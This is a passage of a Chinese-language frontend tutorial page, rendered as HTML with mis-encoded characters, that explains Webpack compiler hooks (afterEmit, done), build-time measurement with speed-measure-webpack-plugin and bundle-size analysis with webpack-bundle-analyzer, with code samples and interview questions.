function_">plugin</span>(<span class="hljs-string">&#x27;beforeBuild&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">config</span>) =&gt;</span> &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;æ³¨å…¥è‡ªå®šä¹‰è§„åˆ™&#x27;</span>);<br>    config.<span class="hljs-property">module</span>.<span class="hljs-property">rules</span>.<span class="hljs-title function_">push</span>(...);<br>  &#125;);<br>&#125;;<br></code></pre></td></tr></table></figure><p><strong>é¢è¯•è¦ç‚¹æ€»ç»“</strong></p><p>Qï¼šä¸ºä»€ä¹ˆéœ€è¦ CLI å°è£… Webpackï¼Ÿ</p><ul><li>è§£å†³é…ç½®ç¢ç‰‡åŒ–ã€ç»Ÿä¸€å›¢é˜Ÿè§„èŒƒã€é›†æˆé«˜çº§åŠŸèƒ½ï¼ˆå¦‚å®‰å…¨æ‰«æ&#x2F;æ€§èƒ½åˆ†æï¼‰</li></ul><p>Qï¼šå¦‚ä½•å®ç°é…ç½®çš„åŠ¨æ€ç”Ÿæˆï¼Ÿ</p><p>å…³é”®æŠ€æœ¯ï¼š</p><ul><li>åŸºäºç¯å¢ƒå˜é‡åˆå¹¶é…ç½®</li><li>å‡½æ•°å¼é…ç½®ç”Ÿæˆï¼ˆå¦‚ defineConfigï¼‰</li><li>æ’ä»¶æ‰©å±•ç‚¹</li></ul><p>Qï¼šæ„å»ºè¿‡ç¨‹å¡æ­»å¦‚ä½•è¯Šæ–­ï¼Ÿ</p><p>æ’æŸ¥æ–¹æ¡ˆï¼š</p><ul><li>æ·»åŠ  â€“inspect-brk è°ƒè¯• Webpack</li><li>ä½¿ç”¨ progress-plugin å®šä½å¡ä½é˜¶æ®µ</li><li>åˆ†æçº¿ç¨‹é”ï¼ˆç‰¹åˆ«æ˜¯å¤šè¿›ç¨‹åœºæ™¯ï¼‰</li></ul><p>Qï¼šå¦‚ä½•ç¡®ä¿ CLI çš„å‘åå…¼å®¹ï¼Ÿ</p><p>ç­–ç•¥ï¼š</p><ul><li>è¯­ä¹‰åŒ–ç‰ˆæœ¬æ§åˆ¶</li><li>å¼ƒç”¨è­¦å‘Šç³»ç»Ÿ</li><li>è¿ç§»æŒ‡å—ç”Ÿæˆå™¨</li></ul><h3 id="4-3-2-é’©å­å‡½æ•°æ·±åº¦ä½¿ç”¨ï¼ˆafterEmit-doneï¼‰"><a href="#4-3-2-é’©å­å‡½æ•°æ·±åº¦ä½¿ç”¨ï¼ˆafterEmit-doneï¼‰" class="headerlink" title="4.3.2 é’©å­å‡½æ•°æ·±åº¦ä½¿ç”¨ï¼ˆafterEmit&#x2F;doneï¼‰"></a>4.3.2 é’©å­å‡½æ•°æ·±åº¦ä½¿ç”¨ï¼ˆ<code>afterEmit</code>&#x2F;<code>done</code>ï¼‰</h3><p><strong>æ ¸å¿ƒé’©å­åˆ†ç±»ä¸æ—¶æœº</strong></p><pre class="mermaid">graph LR  A[åˆå§‹åŒ–] --> B[ç¼–è¯‘] --> C[å°åŒ…] --> D[ä¼˜åŒ–] --> E[è¾“å‡º] --> F[ç»“æŸ]    subgraph å…³é”®é’©å­    B --> compiler.make(å¼€å§‹ç¼–è¯‘)    C --> compilation.processAssets(èµ„æºå¤„ç†)    E -->|è¾“å‡ºå| compiler.afterEmit(èµ„æºå†™å…¥ç£ç›˜)    F --> compiler.done(æ„å»ºå®Œæˆ)  end</pre><p><strong>é’©å­æ³¨å†Œæœºåˆ¶è¯¦è§£</strong></p><p>(1) åŸºç¡€æ³¨å†Œæ–¹å¼</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// åŒæ­¥é’©å­</span><br>compiler.<span class="hljs-property">hooks</span>.<span class="hljs-property">afterEmit</span>.<span class="hljs-title function_">tap</span>(<span class="hljs-string">&#x27;MyPlugin&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">compilation</span>) =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;èµ„æºå·²å†™å…¥ç£ç›˜&#x27;</span>);<br>&#125;);<br><br><span class="hljs-comment">// å¼‚æ­¥é’©å­ (æ”¯æŒPromise)</span><br>compiler.<span class="hljs-property">hooks</span>.<span class="hljs-property">done</span>.<span class="hljs-title function_">tapPromise</span>(<span class="hljs-string">&#x27;MyPlugin&#x27;</span>, <span class="hljs-title function_">async</span> (stats) =&gt; &#123;<br>  <span class="hljs-keyword">await</span> <span class="hljs-title function_">uploadToCDN</span>(stats); <br>&#125;);<br></code></pre></td></tr></table></figure><p>(2) æ‰§è¡Œä¼˜å…ˆçº§æ§åˆ¶</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// é€šè¿‡stageè°ƒæ•´æ‰§è¡Œé¡ºåºï¼ˆæ•°å€¼è¶Šå°ä¼˜å…ˆçº§è¶Šé«˜ï¼‰</span><br>compiler.<span class="hljs-property">hooks</span>.<span class="hljs-property">afterEmit</span>.<span class="hljs-title function_">tap</span>(<br>  &#123; <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;PluginA&#x27;</span>, <span class="hljs-attr">stage</span>: -<span class="hljs-number">10</span> &#125;, <span class="hljs-comment">// ä¼˜å…ˆæ‰§è¡Œ</span><br>  <span class="hljs-function">() =&gt;</span> &#123; ... &#125;<br>);<br><br>compiler.<span class="hljs-property">hooks</span>.<span class="hljs-property">afterEmit</span>.<span class="hljs-title function_">tap</span>(<br>  &#123; <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;PluginB&#x27;</span>, <span class="hljs-attr">stage</span>: <span class="hljs-number">10</span> &#125;, <span class="hljs-comment">// å»¶åæ‰§è¡Œ</span><br>  <span class="hljs-function">() =&gt;</span> &#123; ... &#125;<br>);<br></code></pre></td></tr></table></figure><p><strong>ä¼ä¸šçº§åº”ç”¨åœºæ™¯</strong></p><p>(1) æ„å»ºç»“æœåˆ†æï¼ˆafterEmitï¼‰</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">BuildAnalyzerPlugin</span> &#123;<br>  <span class="hljs-title function_">apply</span>(<span class="hljs-params">compiler</span>) &#123;<br>    compiler.<span class="hljs-property">hooks</span>.<span class="hljs-property">afterEmit</span>.<span class="hljs-title function_">tap</span>(<span class="hljs-string">&#x27;BuildAnalyzer&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">compilation</span>) =&gt;</span> &#123;<br>      <span class="hljs-keyword">const</span> assets = compilation.<span class="hljs-title function_">getAssets</span>();<br>      <span class="hljs-keyword">const</span> report = &#123;<br>        <span class="hljs-attr">buildTime</span>: <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>() - compilation.<span class="hljs-property">startTime</span>,<br>        <span class="hljs-attr">totalSize</span>: assets.<span class="hljs-title function_">reduce</span>(<span class="hljs-function">(<span class="hljs-params">sum, asset</span>) =&gt;</span> sum + asset.<span class="hljs-property">size</span>, <span class="hljs-number">0</span>),<br>        <span class="hljs-attr">largestAsset</span>: assets.<span class="hljs-title function_">sort</span>(<span class="hljs-function">(<span class="hljs-params">a, b</span>) =&gt;</span> b.<span class="hljs-property">size</span> - a.<span class="hljs-property">size</span>)[<span class="hljs-number">0</span>].<span class="hljs-property">name</span><br>      &#125;;<br>      <br>      <span class="hljs-comment">// å†™å…¥åˆ†ææŠ¥å‘Š</span><br>      compilation.<span class="hljs-title function_">emitAsset</span>(<br>        <span class="hljs-string">&#x27;build-report.json&#x27;</span>,<br>        <span class="hljs-keyword">new</span> sources.<span class="hljs-title class_">RawSource</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(report))<br>    &#125;);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>(2) èµ„æºè‡ªåŠ¨ä¸Šä¼ ï¼ˆdoneï¼‰</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript">compiler.<span class="hljs-property">hooks</span>.<span class="hljs-property">done</span>.<span class="hljs-title function_">tapPromise</span>(<span class="hljs-string">&#x27;OSSPlugin&#x27;</span>, <span class="hljs-title function_">async</span> (stats) =&gt; &#123;<br>  <span class="hljs-keyword">if</span> (stats.<span class="hljs-title function_">hasErrors</span>()) <span class="hljs-keyword">return</span>; <span class="hljs-comment">// æ„å»ºå¤±è´¥ä¸ä¸Šä¼ </span><br>  <br>  <span class="hljs-keyword">const</span> files = glob.<span class="hljs-title function_">sync</span>(<span class="hljs-string">&#x27;dist/**/*.&#123;js,css,woff2&#125;&#x27;</span>);<br>  <span class="hljs-keyword">await</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">all</span>(files.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">file</span> =&gt;</span> &#123;<br>    <span class="hljs-keyword">return</span> ossClient.<span class="hljs-title function_">put</span>(file, path.<span class="hljs-title function_">resolve</span>(file));<br>  &#125;));<br>  <br>  <span class="hljs-comment">// æ›´æ–°ç‰ˆæœ¬æ¸…å•</span><br>  <span class="hljs-keyword">await</span> <span class="hljs-title function_">updateVersionManifest</span>(stats.<span class="hljs-property">hash</span>);<br>&#125;);<br></code></pre></td></tr></table></figure><p>(3) æ„å»ºé€šçŸ¥é›†æˆ</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript">compiler.<span class="hljs-property">hooks</span>.<span class="hljs-property">done</span>.<span class="hljs-title function_">tap</span>(<span class="hljs-string">&#x27;SlackNotifier&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">stats</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> message = stats.<span class="hljs-title function_">hasErrors</span>() <br>    ? <span class="hljs-string">`âŒ æ„å»ºå¤±è´¥: <span class="hljs-subst">$&#123;stats.compilation.errors[<span class="hljs-number">0</span>].message&#125;</span>`</span><br>    : <span class="hljs-string">`âœ… æ„å»ºæˆåŠŸ! è€—æ—¶: <span class="hljs-subst">$&#123;stats.endTime - stats.startTime&#125;</span>ms`</span>;<br>    <br>  slack.<span class="hljs-title function_">send</span>(&#123;<br>    <span class="hljs-attr">text</span>: message,<br>    <span class="hljs-attr">attachments</span>: [&#123;<br>      <span class="hljs-attr">title</span>: <span class="hljs-string">&#x27;æ„å»ºæŠ¥å‘Š&#x27;</span>,<br>      <span class="hljs-attr">fields</span>: [&#123;<br>        <span class="hljs-attr">title</span>: <span class="hljs-string">&#x27;ç‰ˆæœ¬å“ˆå¸Œ&#x27;</span>,<br>        <span class="hljs-attr">value</span>: stats.<span class="hljs-property">hash</span><br>      &#125;]<br>    &#125;]<br>  &#125;);<br>&#125;);<br></code></pre></td></tr></table></figure><p><strong>é¢è¯•æ·±åº¦é—®é¢˜</strong></p><p>(1) afterEmit å’Œ done çš„æœ¬è´¨åŒºåˆ«ï¼Ÿ</p><ul><li>afterEmitï¼šèµ„æºå·²å†™å…¥ç£ç›˜ä½†æ„å»ºæœªç»“æŸï¼Œå¯è¿½åŠ æ–°èµ„æº</li><li>doneï¼šæ‰€æœ‰æµç¨‹å·²å®Œæˆï¼Œé€‚åˆé€šçŸ¥&#x2F;æ¸…ç†æ“ä½œ</li></ul><p>(2) å¦‚ä½•ä¿®æ”¹å·²å­˜åœ¨çš„è¾“å‡ºæ–‡ä»¶ï¼Ÿ</p><p>æ–¹æ¡ˆï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript">compilation.<span class="hljs-property">hooks</span>.<span class="hljs-property">processAssets</span>.<span class="hljs-title function_">tap</span>(<br>  &#123; <span class="hljs-attr">stage</span>: <span class="hljs-title class_">Compilation</span>.<span class="hljs-property">PROCESS_ASSETS_STAGE_OPTIMIZE</span> &#125;,<br>  <span class="hljs-function">(<span class="hljs-params">assets</span>) =&gt;</span> &#123;<br>    <span class="hljs-keyword">const</span> source = assets[<span class="hljs-string">&#x27;main.js&#x27;</span>].<span class="hljs-title function_">source</span>();<br>    <span class="hljs-keyword">const</span> newSource = source.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/console\.log/g</span>, <span class="hljs-string">&#x27;&#x27;</span>);<br>    compilation.<span class="hljs-title function_">updateAsset</span>(<span class="hljs-string">&#x27;main.js&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">RawSource</span>(newSource));<br>  &#125;<br>);<br></code></pre></td></tr></table></figure><p>(3) å¤šæ’ä»¶å¦‚ä½•ä¿è¯æ‰§è¡Œé¡ºåºï¼Ÿ</p><p>æ§åˆ¶ç­–ç•¥ï¼š</p><ul><li>ä½¿ç”¨ stage å‚æ•°æ˜¾å¼æ’åº</li><li>é€šè¿‡ tapAsync + å›è°ƒç­‰å¾…å‰ç½®æ’ä»¶</li><li>åœ¨æ’ä»¶åæ·»åŠ æ’åºå‰ç¼€ï¼ˆ01_PluginA, 02_PluginBï¼‰</li></ul><h1 id="äº”ã€è°ƒè¯•ä¸æ€§èƒ½åˆ†æ"><a href="#äº”ã€è°ƒè¯•ä¸æ€§èƒ½åˆ†æ" class="headerlink" title="äº”ã€è°ƒè¯•ä¸æ€§èƒ½åˆ†æ"></a>äº”ã€è°ƒè¯•ä¸æ€§èƒ½åˆ†æ</h1><h2 id="5-1-æ„å»ºè¿‡ç¨‹ç›‘æ§"><a href="#5-1-æ„å»ºè¿‡ç¨‹ç›‘æ§" class="headerlink" title="5.1 æ„å»ºè¿‡ç¨‹ç›‘æ§"></a>5.1 æ„å»ºè¿‡ç¨‹ç›‘æ§</h2><h3 id="5-1-1-speed-measure-webpack-pluginï¼ˆæ„å»ºè€—æ—¶åˆ†æï¼‰"><a href="#5-1-1-speed-measure-webpack-pluginï¼ˆæ„å»ºè€—æ—¶åˆ†æï¼‰" class="headerlink" title="5.1.1 speed-measure-webpack-pluginï¼ˆæ„å»ºè€—æ—¶åˆ†æï¼‰"></a>5.1.1 <code>speed-measure-webpack-plugin</code>ï¼ˆæ„å»ºè€—æ—¶åˆ†æï¼‰</h3><p><strong>æ ¸å¿ƒä»·å€¼ä¸å·¥ä½œåŸç†</strong></p><pre class="mermaid">graph LR  A[Webpack ç¼–è¯‘] --> B[æ’ä»¶æ³¨å…¥è®¡æ—¶å™¨]  B --> C[ç›‘æ§Loader/Pluginç”Ÿå‘½å‘¨æœŸ]  C --> D[ç”Ÿæˆé˜¶æ®µè€—æ—¶æŠ¥å‘Š]  D --> E[å¯è§†åŒ–è¾“å‡ºç“¶é¢ˆç‚¹]</pre><p>æ ¸å¿ƒèƒ½åŠ›ï¼š</p><ul><li>æµ‹é‡ Loader å’Œ Plugin ç²¾ç¡®è€—æ—¶</li><li>æ˜¾ç¤ºå¹¶è¡Œ&#x2F;ä¸²è¡Œä»»åŠ¡é“¾å…³ç³»</li><li>è¾“å‡ºå¯äº¤äº’çš„ç»ˆç«¯æŠ¥å‘Š</li></ul><p><strong>åŸºç¡€é…ç½®ä¸è¾“å‡ºè§£æ</strong></p><p>(1) å®‰è£…ä¸é›†æˆ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">npm install speed-measure-webpack-plugin --save-dev<br></code></pre></td></tr></table></figure><p>(2) åŸºç¡€é…ç½®</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// webpack.config.js</span><br><span class="hljs-keyword">const</span> <span class="hljs-title class_">SpeedMeasurePlugin</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;speed-measure-webpack-plugin&quot;</span>);<br><span class="hljs-keyword">const</span> smp = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SpeedMeasurePlugin</span>();<br><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = smp.<span class="hljs-title function_">wrap</span>(&#123;<br>  <span class="hljs-comment">// åŸå§‹Webpacké…ç½®</span><br>  <span class="hljs-attr">module</span>: &#123;<br>    <span class="hljs-attr">rules</span>: [&#123;<br>      <span class="hljs-attr">test</span>: <span class="hljs-regexp">/\.js$/</span>,<br>      <span class="hljs-attr">use</span>: [<span class="hljs-string">&#x27;babel-loader&#x27;</span>]<br>    &#125;]<br>  &#125;,<br>  <span class="hljs-attr">plugins</span>: [<span class="hljs-keyword">new</span> <span class="hljs-title class_">HtmlWebpackPlugin</span>()]<br>&#125;);<br></code></pre></td></tr></table></figure><p>(3) ç»ˆç«¯æŠ¥å‘Šè§£è¯»</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"> SMP  â±  <br>General output <span class="hljs-keyword">time</span> took 15.25 secs<br><br> SMP  â±  Plugins<br>HtmlWebpackPlugin took 3.21 secs<br><br> SMP  â±  Loaders<br>babel-loader took 8.43 secs, 25% of total <span class="hljs-keyword">time</span><br>  modules with no loaders took 1.2 secs<br></code></pre></td></tr></table></figure><p><strong>é«˜çº§é…ç½®æŠ€å·§</strong></p><p>(1) é€‰æ‹©æ€§ç›‘æ§</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">new</span> <span class="hljs-title class_">SpeedMeasurePlugin</span>(&#123;<br>  <span class="hljs-attr">disable</span>: process.<span class="hljs-property">env</span>.<span class="hljs-property">NODE_ENV</span> === <span class="hljs-string">&#x27;production&#x27;</span>, <span class="hljs-comment">// ç”Ÿäº§ç¯å¢ƒç¦ç”¨</span><br>  <span class="hljs-attr">outputFormat</span>: <span class="hljs-string">&#x27;human&#x27;</span>, <span class="hljs-comment">// å¯é€‰ï¼šhuman/json</span><br>  <span class="hljs-attr">loaderTopFiles</span>: <span class="hljs-number">5</span>, <span class="hljs-comment">// æ˜¾ç¤ºå‰5ä¸ªè€—æ—¶Loader</span><br>  <span class="hljs-attr">pluginTopFiles</span>: <span class="hljs-number">3</span>   <span class="hljs-comment">// æ˜¾ç¤ºå‰3ä¸ªè€—æ—¶Plugin</span><br>&#125;)<br></code></pre></td></tr></table></figure><p>(2) å¤šé…ç½®æ”¯æŒ</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// åˆå¹¶å¤šä¸ªé…ç½®çš„è€—æ—¶</span><br><span class="hljs-keyword">const</span> config1 = &#123; <span class="hljs-comment">/* é…ç½®A */</span> &#125;;<br><span class="hljs-keyword">const</span> config2 = &#123; <span class="hljs-comment">/* é…ç½®B */</span> &#125;;<br><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = [<br>  smp.<span class="hljs-title function_">wrap</span>(config1),<br>  smp.<span class="hljs-title function_">wrap</span>(config2)<br>];<br></code></pre></td></tr></table></figure><p>(3) ç”ŸæˆHTMLæŠ¥å‘Š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> &#123; <span class="hljs-title class_">WebpackStatsWriterPlugin</span> &#125; = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;webpack-stats-plugin&quot;</span>);<br><br><span class="hljs-attr">plugins</span>: [<br>  <span class="hljs-keyword">new</span> <span class="hljs-title class_">WebpackStatsWriterPlugin</span>(&#123;<br>    <span class="hljs-attr">filename</span>: <span class="hljs-string">&quot;build-stats.json&quot;</span> <br>  &#125;)<br>]<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">// åˆ†æå‘½ä»¤<br>npx smp-analyze build-stats.json --output report.html<br></code></pre></td></tr></table></figure><p><strong>é¿å‘æŒ‡å—</strong></p><p>(1) æ’ä»¶å…¼å®¹æ€§é—®é¢˜</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// è§£å†³æ–¹æ¡ˆï¼šåŒ…è£…ç‰¹å®šæ’ä»¶</span><br><span class="hljs-attr">plugins</span>: smp.<span class="hljs-title function_">wrap</span>(&#123;<br>  <span class="hljs-attr">plugins</span>: [<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">IncompatiblePlugin</span>() <span class="hljs-comment">// è¢«smpç‰¹æ®Šå¤„ç†</span><br>  ]<br>&#125;)<br></code></pre></td></tr></table></figure><p>(2) æ—¶é—´æµ‹é‡è¯¯å·®</p><ul><li>å…³é—­å…¶ä»–CPUå¯†é›†å‹åº”ç”¨</li><li>å¤šæ¬¡æµ‹é‡å–å¹³å‡å€¼ï¼ˆå»ºè®®3æ¬¡ä»¥ä¸Šï¼‰</li></ul><p>(3) ç”Ÿäº§ç¯å¢ƒä½¿ç”¨</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// é€šè¿‡ç¯å¢ƒå˜é‡ç¦ç”¨</span><br><span class="hljs-keyword">if</span> (process.<span class="hljs-property">env</span>.<span class="hljs-property">ANALYZE_BUILD</span>) &#123;<br>  config = smp.<span class="hljs-title function_">wrap</span>(config);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="5-1-2-webpack-bundle-analyzerï¼ˆäº§ç‰©ä½“ç§¯å¯è§†åŒ–ï¼‰"><a href="#5-1-2-webpack-bundle-analyzerï¼ˆäº§ç‰©ä½“ç§¯å¯è§†åŒ–ï¼‰" class="headerlink" title="5.1.2 webpack-bundle-analyzerï¼ˆäº§ç‰©ä½“ç§¯å¯è§†åŒ–ï¼‰"></a>5.1.2 <code>webpack-bundle-analyzer</code>ï¼ˆäº§ç‰©ä½“ç§¯å¯è§†åŒ–ï¼‰</h3><p><strong>æ ¸å¿ƒåŠŸèƒ½å…¨æ™¯å›¾</strong></p><pre class="mermaid">graph LR  A[Webpack Stats] --> B[Analyzer]  B --> C[äº¤äº’å¼æ ‘çŠ¶å›¾]  B --> D[æ¨¡å—ä½“ç§¯æ’è¡Œæ¦œ]  B --> E[é‡å¤ä¾èµ–æ£€æµ‹]  C --> F[ä¼˜åŒ–å†³ç­–]</pre><p>æ ¸å¿ƒä»·å€¼ï¼š</p><ul><li>å¯è§†åŒ–æ¨¡å—ä½“ç§¯å æ¯”</li><li>è¯†åˆ«é‡å¤ä¾èµ–&#x2F;æœªä½¿ç”¨ä»£ç </li><li>åˆ†ææŒ‰éœ€åŠ è½½æ•ˆæœ</li></ul><p><strong>è¿›é˜¶é…ç½®ä¸è§£è¯»æŠ€å·§</strong></p><p>(1) ç²¾å‡†é…ç½®æ–¹æ¡ˆ</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> <span class="hljs-title class_">BundleAnalyzerPlugin</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;webpack-bundle-analyzer&#x27;</span>)<br>  .<span class="hljs-property">BundleAnalyzerPlugin</span>;<br><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123;<br>  <span class="hljs-attr">plugins</span>: [<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">BundleAnalyzerPlugin</span>(&#123;<br>      <span class="hljs-attr">analyzerMode</span>: <span class="hljs-string">&#x27;server&#x27;</span>,     <span class="hljs-comment">// å¯é€‰ï¼šserver/static/json/disabled</span><br>      <span class="hljs-attr">analyzerHost</span>: <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<br>      <span class="hljs-attr">analyzerPort</span>: <span class="hljs-number">8888</span>,         <span class="hljs-comment">// è‡ªå®šä¹‰ç«¯å£</span><br>      <span class="hljs-attr">openAnalyzer</span>: <span class="hljs-literal">false</span>,        <span class="hljs-comment">// ç¦æ­¢è‡ªåŠ¨æ‰“å¼€æµè§ˆå™¨</span><br>      <span class="hljs-attr">reportFilename</span>: <span class="hljs-string">&#x27;report.html&#x27;</span>,<br>      <span class="hljs-attr">defaultSizes</span>: <span class="hljs-string">&#x27;parsed&#x27;</span>,     <span class="hljs-comment">// æ˜¾ç¤ºè§£æåä½“ç§¯(gzipå‰)</span><br>      <span class="hljs-attr">statsOptions</span>: &#123;<br>        <span class="hljs-attr">excludeModules</span>: <span class="hljs-regexp">/node_modules\/core-js/</span> <span class="hljs-comment">// æ’é™¤ç‰¹å®šæ¨¡å—</span><br>      &#125;,<br>      <span class="hljs-attr">generateStatsFile</span>: <span class="hljs-literal">true</span>,    <span class="hljs-comment">// ç”Ÿæˆstats.json</span><br>      <span class="hljs-attr">statsFilename</span>: <span class="hljs-string">&#x27;stats.json&#x27;</span><br>    &#125;)<br>  ]<br>&#125;<br></code></pre></td></tr></table></figure><p>(2) å…³é”®è§†å›¾è§£è¯»</p><table><thead><tr><th align="left">è§†å›¾ç±»å‹</th><th align="left">åˆ†æé‡ç‚¹</th><th align="left">ä¼˜åŒ–æ–¹å‘</th></tr></thead><tbody><tr><td align="left">æ ‘çŠ¶å›¾(Treemap)</td><td align="left">çŸ©å½¢é¢ç§¯&#x3D;æ¨¡å—ä½“ç§¯</td><td align="left">å®šä½ä½“ç§¯å¼‚å¸¸æ¨¡å—</td></tr><tr><td align="left">ç½‘ç»œå›¾(Network)</td><td align="left">æ¨¡å—ä¾èµ–å…³ç³»</td><td align="left">è¯†åˆ«é‡å¤ä¾èµ–åŒ…</td></tr><tr><td align="left">æ’è¡Œæ¦œ(Toplist)</td><td align="left">ä½“ç§¯TOP10æ¨¡å—</td><td align="left">ä¼˜å…ˆä¼˜åŒ–å¤§å¤´æ¨¡å—</td></tr><tr><td align="left">æ—¶é—´çº¿(Timeline)</td><td align="left">æ¨¡å—åŠ å…¥é¡ºåº</td><td align="left">ä¼˜åŒ–å¼‚æ­¥åŠ è½½æ—¶æœº</td></tr></tbody></table><p><strong>é«˜çº§åˆ†ææŠ€å·§</strong></p><p>(1) æºç æ˜ å°„åˆ†æ</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs 